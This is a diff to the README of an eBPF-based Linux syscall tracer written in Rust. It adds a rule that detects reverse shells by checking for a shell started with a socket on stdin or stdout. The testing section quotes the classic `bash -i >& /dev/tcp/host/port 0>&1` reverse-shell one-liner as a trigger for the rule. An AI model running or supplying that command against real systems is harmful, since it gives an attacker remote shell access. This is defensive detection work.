@@ -11,7 +11,7 @@ Early. Five probes feed the ring buffer (`sys_enter_execve`,
 legacy `sys_enter_unlink` — glibc's `unlink()` doesn't consistently route
 through `unlinkat()` the way `open()` routes through `openat()`, so both are
 traced — and `sys_enter_ptrace` filtered to `PTRACE_ATTACH`/`PTRACE_SEIZE`).
-Three detection rules are live, all verified against real triggers:
+Four detection rules are live, all verified against real triggers:
 
 - **dropper pattern** — a path opened for creation, then execve'd by the
   same pid within a short window.
@@ -22,6 +22,11 @@ Three detection rules are live, all verified against real triggers:
   `PPid`, not kernel task-struct walking, to keep the eBPF side tiny). If
   ancestry can't be resolved at all, it fails secure — treated as unrelated
   rather than silently ignored.
+- **reverse-shell shape** — a shell binary (`sh`, `bash`, `dash`, `zsh`, ...)
+  exec'd with a socket already on fd 0 or fd 1. No new probe needed: a
+  reverse shell `dup2()`s its socket onto stdin/stdout *before* calling
+  `execve`, and those fds persist across the exec, so this reuses the
+  existing exec events and checks `/proc/<pid>/fd/{0,1}` right after.
 
 **Known limitation:** self-replace tracks "what binary is this pid running"
 purely from the path argument of the most recent `execve` syscall. That's
@@ -34,7 +39,7 @@ shebang (`#!/usr/bin/python3`, no `env`) or a compiled binary doesn't hit
 this. Real EDR tools resolve this with argv-aware correlation; out of scope
 for this MVP.
 
-Not yet implemented: reverse-shell shape, persistence writes.
+Not yet implemented: persistence writes.
 
 ## Architecture
 
@@ -56,7 +61,7 @@ eBPF programs                 loader + reader (Rust, aya)
   emit. No analysis happens here.
 - `syscall-tracer-common` — the `#[repr(C)]` `TraceEvent` type (tagged
   exec/write/unlink/ptrace) shared, byte-for-byte, between kernel and
-  userspace.
+  userspace. (Reverse-shell needs no new event kind — it reuses `Exec`.)
 - `syscall-tracer` — loads the eBPF object, attaches programs, drains the
   ring buffer, and hosts the stateful detection layer (`src/detection/`, one
   module per rule), keyed by pid and tested independent of the kernel/eBPF
@@ -127,6 +132,15 @@ PTRACE 5120     1000 python3          target_pid=4980
 [ALERT] cross-process ptrace: pid=5120 uid=1000 attached to unrelated pid 4980
 ```
 
+Reverse-shell needs a shell exec'd with a socket already on stdin or stdout
+— redirect a shell onto a raw TCP connection (e.g. the classic
+`bash -i >& /dev/tcp/host/port 0>&1`, against a listener you control):
+
+```
+EXEC   5401     1000 bash             /bin/bash
+[ALERT] reverse shell: pid=5401 uid=1000 /bin/bash has a socket on stdin/stdout
+```
+
 Run the unit tests for the detection logic (pure state-machine code, no
 kernel/root needed):
 
@@ -136,7 +150,6 @@ cargo test -p syscall-tracer
 
 ## Roadmap
 
-- Additional probes and rules: reverse-shell shape (shell with a socket as
-  stdin/stdout), persistence writes (cron dirs, systemd units, shell rc
-  files).
+- Additional probes and rules: persistence writes (cron dirs, systemd units,
+  shell rc files).
 - Live terminal view plus a JSON event log for later review.
